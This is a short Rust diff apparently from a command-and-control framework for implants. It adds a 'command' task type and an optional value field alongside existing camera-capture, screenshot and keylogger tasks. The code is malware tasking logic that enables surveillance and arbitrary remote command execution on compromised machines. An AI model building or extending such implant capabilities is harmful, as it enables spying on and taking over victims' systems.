@@ -6,6 +6,7 @@ use uuid;
 pub struct Task {
     pub task_id: uuid::Uuid,
     pub task: String,
+    pub value: Option<String>,
     pub implant_id: uuid::Uuid,
 }
 
@@ -15,6 +16,7 @@ pub enum Tasks {
     TakePicture,
     TakeScreenshot,
     Keylogger,
+    Command,
 }
 
 impl FromStr for Tasks {
@@ -26,6 +28,7 @@ impl FromStr for Tasks {
             "take_picture" => Ok(Tasks::TakePicture),
             "take_screenshot" => Ok(Tasks::TakeScreenshot),
             "keylogger" => Ok(Tasks::Keylogger),
+            "command" => Ok(Tasks::Command),
             _ => Err(()),
         }
     }
